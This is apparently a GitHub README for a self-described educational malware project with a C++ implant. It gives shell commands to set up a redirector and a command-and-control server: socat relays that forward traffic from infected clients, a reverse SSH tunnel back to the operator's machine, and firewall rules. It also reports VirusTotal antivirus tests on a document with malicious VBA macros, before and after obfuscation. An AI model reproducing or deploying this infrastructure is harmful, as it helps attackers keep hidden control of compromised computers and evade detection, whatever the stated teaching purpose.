# Malware-in-practice

Malware in Practice is a comprehensive project aimed at conducting an in-depth analysis of existing malware types and products, understanding their attack vectors, and exploring malicious methods used in the wild. The project also involves creating and testing a custom example of malware to demonstrate these concepts practically. The completed project includes a program written in C++ and a complete setup of the server infrastructure.

# Disclaimer
For educational purposes only


## Redirector setting up
To set up redirector server, which wil communicate with the infected client, you should run the following commands
```bash
  export PATH=$PATH:/usr/bin
  sudo apt update
  sudo apt install -y socat tmux git nginx vim wget net-tools nmap
  sudo ufw enable #firewall setting up
  sudo ufw allow 'configured_port' 22 8080 80
  sudo ufw reload
  socat TCP-LISTEN:'configured_port',fork TCP:'C2_server_ip':'C2_port'
```

## Main C2 server setting up
To set up main server, which will communicate with command panel via reverse SSH tunnel, you should run the following commands
```bash
  export PATH=$PATH:/usr/bin
  sudo apt update
  sudo apt install -y socat tmux git nginx vim wget net-tools nmap
  sudo ufw enable #firewall setting up
  sudo ufw allow 'C2_port',22,'SSH_tunnel_port'/tcp
  sudo ufw reload
  socat TCP-LISTEN:'C2_port',fork TCP:127.0.0.1:'SSH_tunnel_port'
```
## Reverse SSH tunnel
Run this command on your PC
```bash
  ssh -v -R 'SSH_tunnel_port':127.0.0.1:'configured_port' root@'C2_server_ip'
```
## AV detecting Tests

The following tests were performed on the document with malicious VBA macros

![Document without any obfuscation](https://github.com/Danil49/Malware-in-practice/tree/main/figures/virustotal-result-1.png?raw=true)
https://www.virustotal.com/gui/file/e58efdf0f1d9f44df516a77d09f1ee4950b006e8ddcb410c9c634c46939dfc6f/detection


![Document with obfuscated macros](https://github.com/Danil49/Malware-in-practice/tree/main/figures/virustotal-result-2.png?raw=true)
https://www.virustotal.com/gui/file/02dad9ca41f47e219a369cd5b8998ae5eb32f214105c3af01fd0cda6218f33a6?nocache=1